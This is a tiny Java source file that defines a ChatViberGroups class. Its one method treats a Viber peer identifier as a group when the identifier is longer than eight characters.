package com.android.networking.module.chat;

public class ChatViberGroups extends ChatGroups {

	@Override
	boolean isGroup(String peer) {
		return peer.length() > 8;
	}

	
}
